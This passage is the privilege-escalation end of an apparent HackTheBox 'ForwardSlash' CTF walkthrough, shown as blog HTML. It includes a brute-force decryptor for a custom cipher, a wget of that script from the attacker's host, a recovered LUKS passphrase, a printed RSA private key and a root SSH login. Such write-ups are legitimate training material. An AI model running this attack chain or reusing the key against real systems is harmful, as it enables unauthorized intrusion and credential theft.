class="line">            <span class="keyword">while</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">                tmp += <span class="number">256</span></span><br><span class="line">            msg[i] = chr(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> encrypt(<span class="string">'REDACTED'</span>, <span class="string">'REDACTED'</span>)</span><br><span class="line"><span class="keyword">print</span> decrypt(<span class="string">'REDACTED'</span>, encrypt(<span class="string">'REDACTED'</span>, <span class="string">'REDACTED'</span>))</span><br></pre></td></tr></table></figure>


<h3 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h3><p>by analyzing this code’ the function applies each character of the key as a mask sequentially for each character of the message. So I created a python script to reverse engineer the code to decrypt the <code>cyphertext</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, msg)</span>:</span></span><br><span class="line">    key = list(key)</span><br><span class="line">    msg = list(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> reversed(key):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(len(msg))):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[<span class="number">-1</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i<span class="number">-1</span>]))</span><br><span class="line">            <span class="keyword">while</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">                tmp += <span class="number">256</span></span><br><span class="line">            msg[i] = chr(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = open(<span class="string">'ciphertext'</span>, <span class="string">'r'</span>).read().rstrip()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">165</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        key = chr(j) * i</span><br><span class="line">        msg = decrypt(key, ciphertext)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'the '</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'be '</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'and '</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'of '</span> <span class="keyword">in</span> msg :</span><br><span class="line">            exit(<span class="string">"Key: &#123;0&#125;, Key length: &#123;1&#125;, Msg: &#123;2&#125;"</span>.format(key, len(key), msg))</span><br></pre></td></tr></table></figure>

<p>From my Kali I transfer it to target machine and execute :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pain@forwardslash:~/encryptorinator$ wget http://10.10.14.114/decrypt.py</span><br><span class="line">--2020-04-29 00:05:55--  http://10.10.14.114/decrypt.py</span><br><span class="line">Connecting to 10.10.14.114:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 833 [text/plain]</span><br><span class="line">Saving to: ‘decrypt.py’</span><br><span class="line"></span><br><span class="line">decrypt.py                                     100%[===================================================================================================&gt;]     833  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-04-29 00:05:55 (95.1 MB/s) - ‘decrypt.py’ saved [833/833]</span><br><span class="line"></span><br><span class="line">pain@forwardslash:~/encryptorinator$</span><br></pre></td></tr></table></figure>

<p>it takes only a second to get the magic word <code>cB!6%sdH8Lj^@Y*$C2cf</code> :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">pain@forwardslash:~/encryptorinator$ chmod +x decrypt.py </span><br><span class="line">pain@forwardslash:~/encryptorinator$ ./decrypt.py </span><br><span class="line">Key: ttttttttttttttttt, Key length: <span class="number">17</span>, Msg: Hl��vF��;�������&amp;you liked my <span class="keyword">new</span> encryption tool, pretty secure huh, anyway here is the key to the encrypted <span class="built_in">image</span> from /var/backups/recovery: cB!<span class="number">6</span>%sdH8Lj^@Y*$C2cf</span><br><span class="line">pain@forwardslash:~/encryptorinator$</span><br></pre></td></tr></table></figure>

<p>Next is to go <code>/backup</code> folder which allowed to run sudo privileges :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">pain@forwardslash:~$ cd /var/</span><br><span class="line">pain@forwardslash:/var$ ls</span><br><span class="line">backups  cache  crash  lib  local  lock  <span class="built_in">log</span>  mail  opt  <span class="built_in">run</span>  snap  spool  tmp  www</span><br><span class="line">pain@forwardslash:/var$ cd backups</span><br><span class="line">pain@forwardslash:/var/backups$ ls</span><br><span class="line">alternatives.tar<span class="number">.0</span>     apt.extended_states<span class="number">.1</span>.gz  <span class="built_in">config</span>.php.bak     dpkg.statoverride<span class="number">.0</span>  group.bak    note.txt    recovery</span><br><span class="line">apt.extended_states<span class="number">.0</span>  apt.extended_states<span class="number">.2</span>.gz  dpkg.diversions<span class="number">.0</span>  dpkg.status<span class="number">.0</span>        gshadow.bak  passwd.bak  shadow.bak</span><br><span class="line">pain@forwardslash:/var/backups$ cd recovery</span><br><span class="line">pain@forwardslash:/var/backups/recovery$ ls</span><br><span class="line">encrypted_backup.img</span><br><span class="line">pain@forwardslash:/var/backups/recovery$ ls -la</span><br><span class="line">total <span class="number">976576</span></span><br><span class="line">drwxrwx--- <span class="number">2</span> root backupoperator       <span class="number">4096</span> May <span class="number">27</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">3</span> root root                 <span class="number">4096</span> Mar <span class="number">24</span> <span class="number">10</span>:<span class="number">10</span> ..</span><br><span class="line">-rw-r----- <span class="number">1</span> root backupoperator <span class="number">1000000000</span> Apr <span class="number">28</span> <span class="number">23</span>:<span class="number">58</span> encrypted_backup.img</span><br><span class="line">pain@forwardslash:/var/backups/recovery$</span><br></pre></td></tr></table></figure>

<p>Now it’s time to execute it and insert the passphrase <code>cB!6%sdH8Lj^@Y*$C2cf</code> :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">pain@forwardslash:/var/backups/recovery$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> /var/backups/recovery/encrypted_backup.img: </span><br><span class="line">pain@forwardslash:/var/backups/recovery$ ls</span><br><span class="line">encrypted_backup.img</span><br><span class="line">pain@forwardslash:/var/backups/recovery$</span><br></pre></td></tr></table></figure>

<p>Now we need to head towards <code>/dev/mapper</code> To check for mapped images :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">pain@forwardslash:~$ sudo /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line">pain@forwardslash:~$ ls</span><br><span class="line">encryptorinator  mnt  note.txt  user.txt</span><br><span class="line">pain@forwardslash:~$ cd mnt</span><br><span class="line">pain@forwardslash:~/mnt$ ls</span><br><span class="line">id_rsa</span><br><span class="line">pain@forwardslash:~/mnt$</span><br></pre></td></tr></table></figure>

<p>inside <code>./mnt</code> folder there’s <code>id_rsa</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK</span><br><span class="line">RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf</span><br><span class="line">yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc</span><br><span class="line">u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu</span><br><span class="line">NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9</span><br><span class="line">MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa</span><br><span class="line">V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg</span><br><span class="line">G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO</span><br><span class="line">3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC</span><br><span class="line">vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p</span><br><span class="line">MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD</span><br><span class="line">Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn</span><br><span class="line">5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs</span><br><span class="line">V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg</span><br><span class="line">e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8</span><br><span class="line">6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh</span><br><span class="line">i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq</span><br><span class="line">tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW</span><br><span class="line">woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi</span><br><span class="line">/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA</span><br><span class="line">1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW</span><br><span class="line">J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr</span><br><span class="line">OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw</span><br><span class="line">ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo</span><br><span class="line">ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h3 id="Get-the-root-flag"><a href="#Get-the-root-flag" class="headerlink" title="Get the root flag"></a>Get the root flag</h3><p>Finally got now the <code>root.txt</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root in htb/boxes/ForwardSlash via 🐍 v3<span class="number">.8</span><span class="number">.2</span> </span><br><span class="line">❯ ssh -i id_rsa root@<span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span></span><br><span class="line">Welcome to Ubuntu <span class="number">18.04</span><span class="number">.4</span> LTS (GNU/Linux <span class="number">4.15</span><span class="number">.0</span><span class="number">-91</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:<span class="comment">//help.ubuntu.com</span></span><br><span class="line"> * Management:     https:<span class="comment">//landscape.canonical.com</span></span><br><span class="line"> * Support:        https:<span class="comment">//ubuntu.com/advantage</span></span><br><span class="line"></span><br><span class="line">  System information as of Wed Apr <span class="number">29</span> <span class="number">00</span>:<span class="number">32</span>:<span class="number">02</span> UTC <span class="number">2020</span></span><br><span class="line"></span><br><span class="line">  System load:  <span class="number">0.0</span>                Processes:            <span class="number">203</span></span><br><span class="line">  Usage of /:   <span class="number">30.8</span>% of <span class="number">19.56</span>GB   Users logged in:      <span class="number">2</span></span><br><span class="line">  Memory usage: <span class="number">12</span>%                IP address <span class="keyword">for</span> ens33: <span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span></span><br><span class="line">  Swap usage:   <span class="number">0</span>%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is <span class="built_in">available</span> <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots <span class="keyword">and</span> improve kernel security. Activate at:</span><br><span class="line">     https:<span class="comment">//ubuntu.com/livepatch</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span> packages can be updated.</span><br><span class="line"><span class="number">0</span> updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to <span class="built_in">connect</span> to https:<span class="comment">//changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed Apr <span class="number">29</span> <span class="number">00</span>:<span class="number">31</span>:<span class="number">34</span> <span class="number">2020</span> from <span class="number">10.10</span><span class="number">.14</span><span class="number">.114</span></span><br><span class="line">root@forwardslash:~<span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@forwardslash:~<span class="meta"># hostname</span></span><br><span class="line">forwardslash</span><br><span class="line">root@forwardslash:~<span class="meta"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@forwardslash:~<span class="meta"># cut -c 1-12 root.txt </span></span><br><span class="line"><span class="number">76</span>aec6f7af6b</span><br><span class="line">root@forwardslash:~<span class="meta"># exit</span></span><br><span class="line">logout</span><br><span class="line">Connection to <span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span> closed.</span><br></pre></td></tr></table></figure>

<hr>
<p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p>
<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
<hr>
<p>Referrences:</p>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" target="_blank" rel="noopener">PayloadAllTheThings - PHP Wrapper</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForwardSlash-Web"><span class="toc-number">4.1.</span> <span class="toc-text">ForwardSlash Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-account"><span class="toc-number">4.2.</span> <span class="toc-text">Create account</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Enumeration"><span class="toc-number">5.1.</span> <span class="toc-text">Web Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-hunt-continuous"><span class="toc-number">6.1.</span> <span class="toc-text">The hunt continuous</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-403"><span class="toc-number">6.2.</span> <span class="toc-text">Bypass 403</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-via-SSH"><span class="toc-number">6.3.</span> <span class="toc-text">Login via SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-to-Pain"><span class="toc-number">6.4.</span> <span class="toc-text">Privilege Escalation to Pain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-user-PAIN"><span class="toc-number">6.5.</span> <span class="toc-text">Get user PAIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-user-txt"><span class="toc-number">6.6.</span> <span class="toc-text">Get user.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cryptography"><span class="toc-number">7.1.</span> <span class="toc-text">Cryptography</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cyphertext"><span class="toc-number">7.2.</span> <span class="toc-text">Cyphertext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encrypter"><span class="toc-number">7.3.</span> <span class="toc-text">Encrypter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypt"><span class="toc-number">7.4.</span> <span class="toc-text">Decrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-root-flag"><span class="toc-number">7.5.</span> <span class="toc-text">Get the root flag</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&text=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&is_video=false&description=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - ForwardSlash ⚔️&body=Check out this article: https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&name=HackTheBox - ForwardSlash ⚔️&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&t=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    InfoSec &#64; medz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
